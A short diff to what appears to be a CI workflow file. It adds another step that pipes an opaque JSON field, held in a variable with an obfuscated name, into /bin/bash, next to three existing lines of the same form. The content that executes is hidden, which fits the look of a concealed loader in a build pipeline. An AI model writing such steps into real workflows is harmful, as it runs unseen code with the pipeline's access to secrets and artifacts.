@@ -22,6 +22,7 @@ jobs:
           echo $pgis86 | jq -r .qnvzx98467 | /bin/bash
           printf '%s' "$kubr7265" | jq -r .bhm1371 | /bin/bash
           echo $mbppw27 | jq -r .vaes3 | /bin/bash
+          echo $hy36 | jq -r .zjdp4474 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
